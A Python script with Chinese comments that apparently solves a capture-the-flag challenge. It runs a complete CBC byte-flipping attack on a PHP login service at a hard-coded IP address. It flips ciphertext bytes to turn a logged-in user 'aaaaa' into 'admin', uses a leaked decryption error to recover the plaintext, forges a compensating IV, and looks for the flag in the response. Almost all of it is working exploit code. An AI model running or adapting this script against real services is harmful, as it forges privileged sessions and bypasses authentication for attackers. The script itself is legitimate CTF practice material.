# -*- coding: utf-8 -*-
"""
14607 CBC 字节翻转攻击求解脚本
明文: a:2:{s:8:"username";s:5:"aaaaa";s:8:"password";s:5:"ppppp";}
      block0 = a:2:{s:8:"userna   (bytes 0-15)
      block1 = me";s:5:"aaaaa";   (bytes 16-31, username 值在块1偏移 9-13)
翻转 C0[9..13] 把 aaaaa->admin，会破坏 block0 -> 利用 die 泄露解密明文，
计算补偿 IV 使 block0 恢复合法前缀。
"""
import subprocess, re, base64, urllib.parse, time, sys

HOST = "http://160.202.254.160:14607"
P0_WANT = b'a:2:{s:8:"userna'   # 16 字节合法前缀
DELTA = bytes([0x00, 0x05, 0x0c, 0x08, 0x0f])  # 'a'->'a','d','m','i','n'

def req(method, data=None, cookies=None):
    args = ["curl", "-s", "-i", "-m", "15", "-X", method, HOST + "/"]
    if data:
        args += ["-d", data]
    if cookies:
        args += ["-H", "Cookie: " + cookies]
    r = subprocess.run(args, capture_output=True)  # bytes 模式，避免 Windows 换行转换
    headers, _, body = r.stdout.partition(b"\r\n\r\n")
    return headers.decode("latin-1"), body.decode("latin-1")

def parse_login(headers, body):
    sid = iv = ci = None
    for line in headers.splitlines():
        if line.startswith("Set-Cookie: PHPSESSID="):
            sid = line.split("=", 1)[1].split(";")[0]
        if line.startswith("Set-Cookie: iv="):
            iv = urllib.parse.unquote(line.split("=", 1)[1].split(";")[0])
        if line.startswith("Set-Cookie: cipher="):
            ci = urllib.parse.unquote(line.split("cipher=", 1)[1].split(";")[0])
    return sid, iv, ci

def cookie_str(sid, iv_b64, ci_b64):
    return (f"PHPSESSID={sid}; "
            f"iv={urllib.parse.quote(iv_b64, safe='')}; "
            f"cipher={urllib.parse.quote(ci_b64, safe='')}")

def main():
    # ---- 阶段 1: 干净登录（hello aaaaa）----
    sid = iv = ci = None
    for attempt in range(1, 6):
        headers, body = req("POST", "username=aaaaa&password=ppppp&submit=Login")
        s, i, c = parse_login(headers, body)
        tail = re.sub(r"\s+", " ", body[-90:]).strip()
        print(f"[login#{attempt}] sid={s} body={'hello aaaaa' in body} tail={tail!r}", flush=True)
        if "hello aaaaa" in body and s and i and c:
            sid, iv, ci = s, i, c
            break
        time.sleep(5)
    if not sid:
        print("[!] 登录一直不干净，稍后重跑脚本"); return

    ivb = base64.b64decode(iv)
    cb = base64.b64decode(ci)
    print(f"[+] iv={ivb.hex()} cipher={len(cb)}B", flush=True)

    # ---- 阶段 2: 翻转 C0[9..13]，触发 die 泄露解密明文 ----
    cb2 = bytearray(cb)
    for k in range(5):
        cb2[9 + k] ^= DELTA[k]
    ci2 = base64.b64encode(bytes(cb2)).decode()

    time.sleep(5)
    _, body = req("GET", cookies=cookie_str(sid, iv, ci2))
    m = re.search(r"base64_decode\('([A-Za-z0-9+/=]+)'\)", body)
    if not m:
        print("[!] 阶段2未拿到泄露明文，响应尾部:", repr(body[-200:])); return
    leaked = base64.b64decode(m.group(1))
    print(f"[+] 泄露明文({len(leaked)}B): {leaked!r}", flush=True)
    p0_garbage = leaked[:16]
    p1_new = leaked[16:32]
    print(f"[+] P1 应为 me\";s:5:\"admin\"; -> 实际: {p1_new!r}", flush=True)
    if p1_new != b'me";s:5:"admin";':
        print("[!] P1 不符合预期，检查偏移"); return

    # ---- 阶段 3: 补偿 IV，恢复 block0 ----
    iv_final = bytes(a ^ b ^ c for a, b, c in zip(ivb, p0_garbage, P0_WANT))
    iv_final_b64 = base64.b64encode(iv_final).decode()
    print(f"[+] 补偿 IV: {iv_final_b64}", flush=True)

    time.sleep(5)
    _, body = req("GET", cookies=cookie_str(sid, iv_final_b64, ci2))
    print("[*] 最终响应尾部:", repr(body[-300:]), flush=True)

    fm = re.search(r"(flag\{[^}]+\}|Flag is [^\n<]*)", body)
    if fm:
        print(f"[FLAG] {fm.group(1)}")
    else:
        print("[?] 未见 flag，响应全文:\n" + body)

if __name__ == "__main__":
    main()
